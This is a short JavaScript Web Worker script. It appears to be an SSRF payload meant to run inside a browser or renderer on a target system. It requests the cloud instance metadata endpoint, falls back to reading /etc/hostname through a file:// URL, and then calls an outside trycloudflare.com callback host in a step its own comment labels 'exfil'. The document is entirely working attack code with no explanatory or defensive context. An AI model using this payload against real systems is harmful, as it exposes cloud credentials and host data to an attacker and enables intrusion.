// Web Worker: runs in separate thread, can make network requests
var x = new XMLHttpRequest();
x.open('GET', 'http://169.254.169.254/latest/meta-data/', false);
try {
  x.send();
  postMessage('IMDS:' + x.responseText);
} catch(e) {
  // Try file read
  var x2 = new XMLHttpRequest();
  x2.open('GET', 'file:///etc/hostname', false);
  try {
    x2.send();
    postMessage('HOST:' + x2.responseText);
  } catch(e2) {
    postMessage('ERR:' + e.message + '|' + e2.message);
  }
}
// Also try to fetch and exfil
fetch('https://influence-barn-expenditures-agriculture.trycloudflare.com/worker-ssrf-callback')
  .catch(function(){});
